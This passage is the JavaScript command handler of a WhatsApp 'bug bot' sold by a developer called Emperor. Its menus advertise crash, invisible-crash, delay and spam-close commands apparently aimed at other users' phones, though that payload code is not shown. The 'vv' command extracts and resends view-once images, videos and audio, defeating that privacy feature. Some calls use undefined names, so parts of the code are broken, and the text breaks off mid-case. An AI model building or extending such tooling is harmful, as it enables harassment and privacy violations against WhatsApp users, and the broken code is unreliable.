require('./settings/config');

const { default: baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia, InteractiveMessage, relayWAMessage,  downloadContentFromMessage } = require("@whiskeysockets/baileys");

const fs = require('fs')
const axios = require('axios')
const yts = require('yt-search')
const fetch = require('node-fetch')
const chalk = require('chalk')
const speed = require('performance-now')
const moment = require('moment-timezone')
const { Sticker } = require('wa-sticker-formatter')
const os = require('os')
const util = require('util')
const { spawn: spawn, exec } = require("child_process")

module.exports = news = async (news, m, chatUpdate, store) => {
try {
// Message type handlers
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);
// starting show prefix
const budy = (typeof m.text === 'string' ? m.text : '');
global.prefa = [".", "!", ",", "", "🐤", "🗿"]; // Do Not Change!!
const prefix = global.prefa
    ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body)
        ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0]
        : ""
    : global.prefa ?? global.prefix;
// Owner & Premium data
const ownerbot = JSON.parse(fs.readFileSync('./lib/owner.json'));
const Premium = JSON.parse(fs.readFileSync('./lib/premium.json'));
// Sender & bot ID (uniform format)
const sender = m.isGroup
    ? (m.key.participant || m.participant || '')
    : m.key.remoteJid;
const botNumber = (await news.decodeJid(news.user.id)) || '';
// Command detection
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1);
const text = q = args.join(" ");
// Creator & premium checks (uniform format)
const isCreator = [botNumber, ...ownerbot]
    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
    .includes(sender);
const isPremium = [botNumber, ...Premium]
    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
    .includes(sender);
// Quoted & group info
const quoted = m.quoted ? m.quoted : m;
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");
const groupMetadata = isGroup ? await news.groupMetadata(from).catch(() => {}) : {};
const groupName = groupMetadata.subject || '';
const groupMembers = isGroup ? groupMetadata.participants : [];
// Get admins in correct format
const getGroupAdmins = (participants) => {
    const admins = [];
    for (const participant of participants) {
        if (participant.admin === 'admin' || participant.admin === 'superadmin') {
            admins.push(participant.id || participant.jid); // ensure correct property
        }
    }
    return admins;
};
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : [];
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
// FIX: Always count bot owner as admin
const isAdmins = isGroup ? groupAdmins.includes(sender) || isCreator : false;
// sender,time,date,name
const pushname = m.pushName || "No Name"
const senderNumber = sender.split('@')[0];
const time = moment(Date.now()).tz('Africa/Lagos').locale('en').format('HH:mm:ss z');
const mime = (quoted.msg || quoted).mimetype || ''
const dateNG = new Date().toLocaleDateString('en-NG', {
  timeZone: 'Africa/Lagos',
  year: 'numeric',
  month: 'long',
  day: 'numeric'
});
const timeNG = new Date().toLocaleTimeString('en-NG', {
  timeZone: 'Africa/Lagos',
  hour: '2-digit',
  minute: '2-digit',
  second: '2-digit',
  hour12: false
});
const fullDateTime = `Date: ${dateNG} | Time: ${timeNG}`;
const nameowner = "emperor bug bot︎";
if (!news.public) {
if (!isCreator) return 
}
// My Func
const { 
smsg, 
sendGmail, 
formatSize, 
isUrl, 
generateMessageTag, 
getBuffer, 
getSizeMedia, 
runtime, 
fetchJson, 
formatp,
getTime,
getRandom,
sleep } = require('./lib/myfunction');

if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#3498db").bold(`⚙️ 𝕹𝖊𝖜 𝕸𝖊𝖘𝖘𝖆𝖌𝖊`));
console.log(
chalk.bgHex("#FFFFFF").black(
` ╭─ ▢ Date: ${new Date().toLocaleString()} \n` +
` ├─ ▢ Messages: ${m.body || m.mtype} \n` +
` ├─ ▢ Sender: ${m.pushname} \n` +
` ╰─ ▢ Number: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#FFFFFF").black(
` ╭─ ▢ GroupName: ${groupName} \n` +
` ╰─ ▢ Groupid**: ${m.chat}`
)
);
}
console.log();
}

const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnailUrl: 'https://files.catbox.moe/5lrtuv.jpg',
      itemCount: "2025",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `𝘾𝙤𝙢𝙢𝙖𝙣𝙙 : ${command}\n 𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝙗𝙮 Emperor`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363397001088335@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
const Reply = (opueh) => {
news.sendMessage(from, {
 text: opueh,
  contextInfo: {
   forwardingScore: 99999,
    isForwarded: true,
     forwardedNewsletterMessageInfo: {
      newsletterJid: "120363397001088335@s.whatsapp.net",
       serverMessageId: null,
        newsletterName: `EMPEROR 𝘽𝙐𝙂`
        },
      externalAdReply: {
        showAdAttribution: true,
          title: `EMPEROR 𝘽𝙐𝙂`,
            body: `𝙑𝙚𝙧𝙨𝙞𝙤𝙣 1.0`,
             mediaType: 1,
              previewType: 'PHOTO',
               thumbnailUrl: 'https://files.catbox.moe/rkhrpl.jpg'
                }
                 }
                   }, { quoted: lol })
                    }
                    
//end
switch(command) {
case "menu": {
await news.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
let menu = `
𝗛𝗶 ${pushname} 𝗜 𝗮𝗺 𝗮 an evil bug bot 𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗕𝘆 EMPEROR ︎

╭──[ 𝐁𝐎𝐓 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ]──╮ 
│➤ 𝘽𝙤𝙩 𝙉𝙖𝙢𝙚 : ${Bot_Name}
│➤ 𝙑𝙚𝙧𝙨𝙞𝙤𝙣 : ${Version}
│➤ 𝙍𝙪𝙣𝙩𝙞𝙢𝙚 : ${runtime(process.uptime())}
│➤ 𝘿𝙚𝙫 : ${Developer}
╰─────────────────────╯

=====[𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔]=====
$ .𝙾𝚠𝚗𝚎𝚛𝚖𝚎𝚗𝚞
$ .𝙶𝚛𝚘𝚞𝚙𝚖𝚎𝚗𝚞
$ .𝙱𝚞𝚐𝚖𝚎𝚗𝚞
$ .𝙾𝚝𝚑𝚎𝚛𝚖𝚎𝚗𝚞
`
// 1. Send button image message
news.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/5lrtuv.jpg" },
  caption: menu,
  footer: "© 2025",
  buttons: [
    {
      buttonId: '.buysc',
      buttonText: {
        displayText: 'BUY 𝚂𝙲'
      },
      type: 1
    },
    {
      buttonId: 'action',
      buttonText: {
        displayText: 'emperor 𝙱𝚞𝚐 𝙱𝚘𝚝︎'
      },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '𝐌𝐄𝐍𝐔',
          sections: [
            {
              title: nameowner,
              highlight_label: 'Powered by : Emperor',
              rows: [
                {
                  header: 'ᴏᴡɴᴇʀ ᴍᴇɴᴜ',
                  title: 'owner',
                  description: 'Display owner menu',
                  id: '.ownermenu'
                },
                {
                  header: 'ʙᴜɢ ᴍᴇɴ𝘂',
                  title: 'bugmenu',
                  description: 'Display Bug menu',
                  id: '.bugmenu'
                }
              ]
            },
            {
              title: "Thanks Section",
              rows: [
                {
                  header: "Thanks to",
                  title: "😎 Supporters",
                  description: "Supporters and credits",
                  id: '.tqto'
                }
              ]
            },
            {
              title: "Other Section",
              rows: [
                {
                  header: "Other menu",
                  title: "✨ Specials",
                  description: "Display Other menu",
                  id: '.othermenu'
                }
              ]
            }
          ]
        })
      }
    }
  ],
  contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363421188610780@newsletter",
      newsletterName: "emperor 𝙱𝚞𝚐 𝙱𝚘𝚝︎"
    }
  },
  headerType: 1,
  viewOnce: true
}, { quoted: lol })

// 2. Delay for 3 seconds
    await new Promise(resolve => setTimeout(resolve, 3000));
    
// Send the audio last
news.sendMessage(m.chat, {
  audio: fs.readFileSync('./lib/menu.mp3'),
  mimetype: 'audio/mpeg',
  ptt: false
}, { quoted: lol })
}

break
 case "bugmenu": {
     let menu = `
𝗛𝗶 ${pushname} 𝗜 𝗮𝗺 𝗮 an evil bug bot  𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗕𝘆 EMPEROR︎︎

╭──[ 𝐁𝐎𝐓 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ]──╮ 
│➤ 𝘽𝙤𝙩 𝙉𝙖𝙢𝙚 : ${Bot_Name}
│➤ 𝙑𝙚𝙧𝙨𝙞𝙤𝙣 : ${Version}
│➤ 𝙍𝙪𝙣𝙩𝙞𝙢𝙚 : ${runtime(process.uptime())}
│➤ 𝘿𝙚𝙫 : ${Developer}
╰─────────────────────╯
     
=====[𝐁𝐔𝐆 𝐌𝐄𝐍𝐔]=====
$ .𝚌𝚛𝚊𝚜𝚑-𝚒𝚘𝚜
$ .𝚍𝚎𝚕𝚊𝚢
$ .𝚒𝚗𝚟𝚒𝚜-𝚌𝚛𝚊𝚜𝚑
$ .𝚜𝚙𝚊𝚖-𝚌𝚕𝚘𝚜𝚎
$ .𝚑𝚘𝚜𝚝-𝚍𝚎𝚕𝚊𝚢
`

// 1. Send button image message
news.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/6fjj4x.jpg" },
  caption: menu,
  footer: "© 2025",
  buttons: [
    {
      buttonId: '.buysc',
      buttonText: {
        displayText: 'BUY 𝚂𝙲'
      },
      type: 1
    },
    {
      buttonId: 'action',
      buttonText: {
        displayText: 'emperor 𝙱𝚞𝚐 𝙱𝚘𝚝︎'
      },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '𝐒𝐄𝐋𝐄𝐂𝐓',
          sections: [
            {
              title: nameowner,
              highlight_label: 'Powered by : Emperor',
              rows: [
                {
                  header: 'ᴏᴡɴᴇʀ ᴍᴇɴᴜ',
                  title: 'owner',
                  description: 'Display owner menu',
                  id: '.ownermenu'
                },
                {
                  header: 'ʙᴜɢ ᴍᴇɴ𝘂',
                  title: 'bugmenu',
                  description: 'Display Bug menu',
                  id: '.bugmenu'
                }
              ]
            },
            {
              title: "Thanks Section",
              rows: [
                {
                  header: "Thanks to",
                  title: "😎 Supporters",
                  description: "Supporters and credits",
                  id: '.tqto'
                }
              ]
            },
            {
              title: "Other Section",
              rows: [
                {
                  header: "Other menu",
                  title: "✨ Specials",
                  description: "Display Other menu",
                  id: '.othermenu'
                }
              ]
            }
          ]
        })
      }
    }
  ],
  contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363421188610780@newsletter",
      newsletterName: "emperor 𝙱𝚞𝚐 𝙱𝚘𝚝︎"
    }
  },
  headerType: 1,
  viewOnce: true
}, { quoted: lol })

// 2. Delay for 3 seconds
    await new Promise(resolve => setTimeout(resolve, 3000));
    
// Send the audio last
news.sendMessage(m.chat, {
  audio: fs.readFileSync('./lib/menu.mp3'),
  mimetype: 'audio/mpeg',
  ptt: false
}, { quoted: lol })
}

break
 case "groupmenu": {
     let menu = `
𝗛𝗶 ${pushname} 𝗜 𝗮𝗺 𝗮 an evil bug bot  𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗕𝘆 Emperor 

╭──[ 𝐁𝐎𝐓 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ]──╮ 
│➤ 𝘽𝙤𝙩 𝙉𝙖𝙢𝙚 : ${Bot_Name}
│➤ 𝙑𝙚𝙧𝙨𝙞𝙤𝙣 : ${Version}
│➤ 𝙍𝙪𝙣𝙩𝙞𝙢𝙚 : ${runtime(process.uptime())}
│➤ 𝘿𝙚𝙫 : ${Developer}
╰─────────────────────╯

=====[𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔]=====
$ .𝚑𝚒𝚍𝚎𝚝𝚊𝚐
$ .𝚝𝚊𝚐𝚊𝚕𝚕
$ .𝚍𝚎𝚕
$ .𝚊𝚗𝚝𝚒𝚕𝚒𝚗𝚔
$ .𝚔𝚒𝚌𝚔
$ .𝚊𝚍𝚍
`

news.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/6fjj4x.jpg" },
  caption: menu,
  footer: "© 2025",
  buttons: [
    {
      buttonId: '.buysc',
      buttonText: {
        displayText: 'BUY 𝚂𝙲'
      },
      type: 1
    },
    {
      buttonId: 'action',
      buttonText: {
        displayText: 'emperor 𝙱𝚞𝚐 𝙱𝚘𝚝︎'
      },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '𝐒𝐄𝐋𝐄𝐂𝐓',
          sections: [
            {
              title: nameowner,
              highlight_label: 'Powered by : Emperor',
              rows: [
                {
                  header: 'ᴏᴡɴᴇʀ ᴍᴇɴᴜ',
                  title: 'owner',
                  description: 'Display owner menu',
                  id: '.ownermenu'
                },
                {
                  header: 'ʙᴜɢ ᴍᴇɴ𝘂',
                  title: 'bugmenu',
                  description: 'Display Bug menu',
                  id: '.bugmenu'
                }
              ]
            },
            {
              title: "Thanks Section",
              rows: [
                {
                  header: "Thanks to",
                  title: "😎 Supporters",
                  description: "Supporters and credits",
                  id: '.tqto'
                }
              ]
            },
            {
              title: "Other Section",
              rows: [
                {
                  header: "Group menu",
                  title: "✨ Specials",
                  description: "Display Group menu",
                  id: '.groupmenu'
                }
              ]
            }
          ]
        })
      }
    }
  ],
  contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363421188610780@newsletter",
      newsletterName: "emperor 𝙱𝚞𝚐 𝙱𝚘𝚝︎"
    }
  },
  headerType: 1,
  viewOnce: true
}, { quoted: lol })

// 2. Delay for 3 seconds
    await new Promise(resolve => setTimeout(resolve, 3000));
    
// Send the audio last
news.sendMessage(m.chat, {
  audio: fs.readFileSync('./lib/menu.mp3'),
  mimetype: 'audio/mpeg',
  ptt: false
}, { quoted: lol })
}
break

case 'ownermenu': {
let menu = `
𝗛𝗶 ${pushname} 𝗜 𝗮𝗺 𝗮 an evil bug bot 𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗕𝘆 Emperor ︎

╭──[ 𝐁𝐎𝐓 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ]──╮ 
│➤ 𝘽𝙤𝙩 𝙉𝙖𝙢𝙚 : ${Bot_Name}
│➤ 𝙑𝙚𝙧𝙨𝙞𝙤𝙣 : ${Version}
│➤ 𝙍𝙪𝙣𝙩𝙞𝙢𝙚 : ${runtime(process.uptime())}
│➤ 𝘿𝙚𝙫 : ${Developer}
╰─────────────────────╯

=====[𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔]=====
$ .𝚊𝚍𝚍𝚙𝚛𝚎𝚖 
$ .𝚍𝚎𝚕𝚙𝚛𝚎𝚖
$ .𝚊𝚍𝚍𝚘𝚠𝚗𝚎𝚛
$ .𝚍𝚎𝚕𝚘𝚠𝚗𝚎𝚛 
$ .𝚙𝚞𝚋𝚕𝚒𝚌
$ .𝚜𝚎𝚕𝚏
$ .𝚛𝚞𝚗𝚝𝚒𝚖𝚎
$ .𝚙𝚒𝚗𝚐
$ .𝚋𝚕𝚘𝚌𝚔
$ .𝚞𝚗𝚋𝚕𝚘𝚌𝚔
`
news.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/6fjj4x.jpg" },
  caption: menu,
  footer: "© 2025",
  buttons: [
    {
      buttonId: '.buysc',
      buttonText: {
        displayText: 'BUY 𝚂𝙲'
      },
      type: 1
    },
    {
      buttonId: 'action',
      buttonText: {
        displayText: 'emperor 𝙱𝚞𝚐 𝙱𝚘𝚝︎'
      },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '𝐒𝐄𝐋𝐄𝐂𝐓',
          sections: [
            {
              title: nameowner,
              highlight_label: 'Powered by : Emperor',
              rows: [
                {
                  header: 'ᴏᴡɴᴇʀ ᴍᴇɴᴜ',
                  title: 'owner',
                  description: 'Display owner menu',
                  id: '.ownermenu'
                },
                {
                  header: 'ʙᴜɢ ᴍᴇɴ𝘂',
                  title: 'bugmenu',
                  description: 'Display Bug menu',
                  id: '.bugmenu'
                }
              ]
            },
            {
              title: "Thanks Section",
              rows: [
                {
                  header: "Thanks to",
                  title: "😎 Supporters",
                  description: "Supporters and credits",
                  id: '.tqto'
                }
              ]
            },
            {
              title: "Other Section",
              rows: [
                {
                  header: "Other menu",
                  title: "✨ Specials",
                  description: "Display Other menu",
                  id: '.othermenu'
                }
              ]
            }
          ]
        })
      }
    }
  ],
  contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363421188610780@newsletter",
      newsletterName: "emperor 𝙱𝚞𝚐 𝙱𝚘𝚝︎"
    }
  },
  headerType: 1,
  viewOnce: true
}, { quoted: lol })

// 2. Delay for 3 seconds
    await new Promise(resolve => setTimeout(resolve, 3000));
    
// Send the audio last
news.sendMessage(m.chat, {
  audio: fs.readFileSync('./lib/menu.mp3'),
  mimetype: 'audio/mpeg',
  ptt: false
}, { quoted: lol })
}
break

case 'othermenu': {
let menu = `
𝗛𝗶 ${pushname} 𝗜 𝗮𝗺 𝗮 an evul bug bot  𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗕𝘆 Emperor 

╭──[ 𝐁𝐎𝐓 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ]──╮ 
│➤ 𝘽𝙤𝙩 𝙉𝙖𝙢𝙚 : ${Bot_Name}
│➤ 𝙑𝙚𝙧𝙨𝙞𝙤𝙣 : ${Version}
│➤ 𝙍𝙪𝙣𝙩𝙞𝙢𝙚 : ${runtime(process.uptime())}
│➤ 𝘿𝙚𝙫 : ${Developer}
╰─────────────────────╯

=====[𝐎𝐓𝐇𝐄𝐑 𝐌𝐄𝐍𝐔]=====
$ .𝚙𝚕𝚊𝚢
$ .𝚞𝚛𝚕
$ .𝚟𝚟
$ .𝚜𝚝𝚒𝚌𝚔𝚎𝚛
$ .𝚍𝚘𝚠𝚗𝚕𝚘𝚊𝚍
`
news.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/6fjj4x.jpg" },
  caption: menu,
  footer: "© 2025",
  buttons: [
    {
      buttonId: '.buysc',
      buttonText: {
        displayText: 'BUY 𝚂𝙲'
      },
      type: 1
    },
    {
      buttonId: 'action',
      buttonText: {
        displayText: 'emperor 𝙱𝚞𝚐 𝙱𝚘𝚝︎'
      },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '𝐒𝐄𝐋𝐄𝐂𝐓',
          sections: [
            {
              title: nameowner,
              highlight_label: 'Powered by : Emperor',
              rows: [
                {
                  header: 'ᴏᴡɴᴇʀ ᴍᴇɴᴜ',
                  title: 'owner',
                  description: 'Display owner menu',
                  id: '.ownermenu'
                },
                {
                  header: 'ʙᴜɢ ᴍᴇɴ𝘂',
                  title: 'bugmenu',
                  description: 'Display Bug menu',
                  id: '.bugmenu'
                }
              ]
            },
            {
              title: "Thanks Section",
              rows: [
                {
                  header: "Thanks to",
                  title: "😎 Supporters",
                  description: "Supporters and credits",
                  id: '.tqto'
                }
              ]
            },
            {
              title: "Other Section",
              rows: [
                {
                  header: "Other menu",
                  title: "✨ Specials",
                  description: "Display Other menu",
                  id: '.othermenu'
                }
              ]
            }
          ]
        })
      }
    }
  ],
  contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363421188610780@newsletter",
      newsletterName: "emperor 𝙱𝚞𝚐 𝙱𝚘𝚝︎"
    }
  },
  headerType: 1,
  viewOnce: true
}, { quoted: lol })

// 2. Delay for 3 seconds
    await new Promise(resolve => setTimeout(resolve, 3000));
    
// Send the audio last
news.sendMessage(m.chat, {
  audio: fs.readFileSync('./lib/menu.mp3'),
  mimetype: 'audio/mpeg',
  ptt: false
}, { quoted: lol })
}
break

case 'tqto': {
let menu = `
𝗛𝗶 ${pushname} 𝗜 𝗮𝗺 𝗮 an evil bug bot  𝗖𝗿𝗲𝗮𝘁𝗲𝗱 𝗕𝘆 Emperor ︎︎

╭──[ 𝐁𝐎𝐓 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ]──╮ 
│➤ 𝘽𝙤𝙩 𝙉𝙖𝙢𝙚 : ${Bot_Name}
│➤ 𝙑𝙚𝙧𝙨𝙞𝙤𝙣 : ${Version}
│➤ 𝙍𝙪𝙣𝙩𝙞𝙢𝙚 : ${runtime(process.uptime())}
│➤ 𝘿𝙚𝙫 : ${Developer}
╰─────────────────────╯

     ━─≪ 𝐂𝐑𝐄𝐃𝐈𝐓𝐒 𝐓𝐎 ≫─━
➤ KING SHAZAM ( MENTOR)
➤ HEIS RAKID (CO DEV)
➤ GAARA (CO DEV)
`
news.sendMessage(m.chat, {
  image: { url: "https://files.catbox.moe/6fjj4x.jpg" },
  caption: menu,
  footer: "𝙲𝚛𝚎𝚊𝚝𝚘𝚛 : emperor ",
  buttons: [
    {
      buttonId: '.buysc',
      buttonText: {
        displayText: 'BUY 𝚂𝙲'
      },
      type: 1
    },
    {
      buttonId: 'action',
      buttonText: {
        displayText: 'emperor 𝙱𝚞𝚐 𝙱𝚘𝚝'
      },
      type: 4,
      nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: '𝐒𝐄𝐋𝐄𝐂𝐓',
          sections: [
            {
              title: nameowner,
              highlight_label: 'Powered by : Emperor',
              rows: [
                {
                  header: 'ᴏᴡɴᴇʀ ᴍᴇɴᴜ',
                  title: 'owner',
                  description: 'Display owner menu',
                  id: '.ownermenu'
                },
                {
                  header: 'ʙᴜɢ ᴍᴇɴ𝘂',
                  title: 'bugmenu',
                  description: 'Display Bug menu',
                  id: '.bugmenu'
                }
              ]
            },
            {
              title: "Thanks Section",
              rows: [
                {
                  header: "Thanks to",
                  title: "😎 Supporters",
                  description: "Supporters and credits",
                  id: '.tqto'
                }
              ]
            },
            {
              title: "Other Section",
              rows: [
                {
                  header: "Other menu",
                  title: "✨ Specials",
                  description: "Display Other menu",
                  id: '.othermenu'
                }
              ]
            }
          ]
        })
      }
    }
  ],
  contextInfo: {
    forwardingScore: 999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363421188610780@newsletter",
      newsletterName: "emperor 𝙱𝚞𝚐 𝙱𝚘𝚝︎"
    }
  },
  headerType: 1,
  viewOnce: true
}, { quoted: lol })

// 2. Delay for 3 seconds
    await new Promise(resolve => setTimeout(resolve, 3000));
    
// Send the audio last
news.sendMessage(m.chat, {
  audio: fs.readFileSync('./lib/menu.mp3'),
  mimetype: 'audio/mpeg',
  ptt: false
}, { quoted: lol })
}

break

case "addowner":{
if (!isCreator) return Reply("only For my Owner");
if (!args[0]) return Reply(`_*Incorrect use* ${prefix+command} \nExample ${prefix+command} 234xxxx`)
gun = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let check = await news.onWhatsApp(gun)
if (check.length == 0) return Reply(`*\`Sorry number not registered on WhatsApp!!!\`*`)
ownerbot.push(gun)
fs.writeFileSync("./lib/owner.json", JSON.stringify(ownerbot))
Reply(`*\`Number ${gun} Added suksexfully to Owner!\`*`)
}
break

case "delowner":{
if (!isCreator) return Reply("only For my Owner");
if (!args[0]) return Reply(`_*Incorrect use* ${prefix+command} \nExample ${prefix+command} 234xxxx`)
yes = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = ownerbot.indexOf(yes)
ownerbot.splice(unp, 1)
fs.writeFileSync("./lib/owner.json", JSON.stringify(ownerbot))
Reply(`*\`Number ${yes} Deleted Suksexfully from Owner!\`*`)
}    
break

case "addprem":{
if (!isCreator) return Reply("only For my Owner");
if (!args[0]) return Reply(`_*Incorrect use* ${prefix+command} \nExample ${prefix+command} 234xxxx`)
gun = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let check = await news.onWhatsApp(gun)
if (check.length == 0) return Reply(`*\`Sorry number not registered on WhatsApp!!!\`*`)
Premium.push(gun)
fs.writeFileSync("./lib/premium.json", JSON.stringify(Premium))
Reply(`*\`Number ${gun} Added suksexfully to Premium!\`*`)
}
 break
case "runtime" : {
let replyme = ` Hey👋 ${pushname} I am emperor Bug bot I am Active since ${runtime(process.uptime())}`;
Reply(replyme)
}
  
break
 
case "delprem":{
if (!isCreator) return Reply("only For my Owner");
if (!args[0]) return Reply(`_*Incorrect use* ${prefix+command} \nExample ${prefix+command} 234xxxx`)
yes = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = Premium.indexOf(yes)
Premium.splice(unp, 1)
fs.writeFileSync("./lib/premium.json", JSON.stringify(Premium))
Reply(`*\`Number ${yes} Deleted Suksexfully from Premium!\`*`)
}    
// clear bug case

break
case "dev":
case "devoloper":
case "owner": {
  let nameown = `Emperor`
  let NoOwn = `2347049474372`
  var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    contactMessage: {
      displayName: nameown,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${NoOwn}:+${NoOwn}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION: Emperor \nX-WA-BIZ-NAME:[[ ༑ EMPEROR 𝗕𝗨𝗚 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nEND:VCARD`
    }
  }), {
    userJid: m.chat,
    quoted: lol
  })
  news.relayMessage(m.chat, contact.message, {
    messageId: contact.key.id
  })
}

        break;
case 'self':
case 'private': {
if (!isCreator) return Reply("only For my Owner");

news.public = false;

Reply('Succesfuly changed To self 🤧')
}

break;
case 'out':
case 'public': {
if (!isCreator) return Reply("Only For my owner Only");

news.public = true;

Reply("Successful Changed To Public")
}
break

case "vv": {
  if (!m.quoted) return Reply("Reply to a View Once message");
  
  let msg = m.quoted.message;
  let type = Object.keys(msg)[0];
  
  if (!msg[type].viewOnce) return m.reply("The message is not View Once!");

  let media = await downloadContentFromMessage(
    msg[type],
    type == 'imageMessage' ? 'image' :
    type == 'videoMessage' ? 'video' : 'audio'
  );

  let buffer = Buffer.from([]);
  for await (const chunk of media) {
    buffer = Buffer.concat([buffer, chunk]);
  }

  if (/video/.test(type)) {
    return ambass.sendMessage(m.chat, { video: buffer, caption: msg[type].caption || "" }, { quoted: lol });
  } else if (/image/.test(type)) {
    return ambass.sendMessage(m.chat, { image: buffer, caption: msg[type].caption || "" }, { quoted: lol });
  } else if (/audio/.test(type)) {
    return ambass.sendMessage(m.chat, { audio: buffer, mimetype: "audio/mpeg", ptt: true }, { quoted: lol });
  }
}
break;

case 'sticker': {
  if (!quoted) return ReplyMulti(`Reply Image or Video with command ${prefix + command}`);
  
  if (/image/.test(mime)) {
    let media = await quoted.download();
    let encmedia = await ambass.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else if (/video/.test(mime)) {
    if ((quoted.msg || quoted).seconds > 11) return ReplyMulti('max 10s');
    
    let media = await quoted.download();
    let encmedia = await ambass.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else {
    return ReplyMulti(`Send Image or Video with command ${prefix + command}\nvideo duration only 1-9s`);
  }
}

break

case 'delete':
case 'del': {
    if (!isCreator && !isAdmins) return Reply("O͜͡n͜͡l͜͡y͜͡ F͜͡o͜͡r͜͡ m͜͡y͜͡ O͜͡w͜͡n͜͡e͜͡r͜͡ A͜͡n͜͡d͜͡ F͜͡o͜͡r͜͡ G͜͡r͜͡o͜͡u͜͡p͜͡ A͜͡d͜͡m͜͡i͜͡n͜͡");
    if (!m.quoted) throw false;
    let { chat, id } = m.quoted;
    news.sendMessage(m.chat, {
        delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.quoted.id,
            participant: m.quoted.sender
        }
    });
}
      break
      
case "getaudiovid": {
    if (!text) return Reply("⚠️ No video file found to convert.");

    try {
        const videoPath = text;
        const audioPath = path.join(__dirname, `temp_${Date.now()}_converted.mp3`);

        await new Promise((resolve, reject) => {
            ffmpeg(videoPath)
